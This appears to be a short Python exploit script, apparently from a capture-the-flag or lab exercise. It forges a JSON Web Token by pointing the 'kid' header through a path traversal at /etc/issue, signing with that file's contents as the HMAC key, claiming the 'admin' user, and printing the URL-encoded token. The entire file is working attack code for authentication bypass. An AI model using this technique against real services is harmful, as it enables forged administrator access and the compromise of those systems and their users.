import hmac
import hashlib
import base64
import urllib

f = open('issue', 'r')

key = f.read()

f.close()

unsigned_toke = base64.b64encode('{"typ":"JWT","alg":"HS256","kid":"../../../../../../etc/issue"}')+"."+base64.b64encode('{"user":"admin"}')

message = bytes(unsigned_toke).encode('utf-8').replace("=","")
secret = bytes(key).encode('utf-8')

hash = hmac.new(secret, message, hashlib.sha256)

hash.hexdigest()

signature = base64.b64encode(hash.digest()).encode('utf-8').replace("=","")
token = message+"."+signature

print(urllib.quote_plus(token))
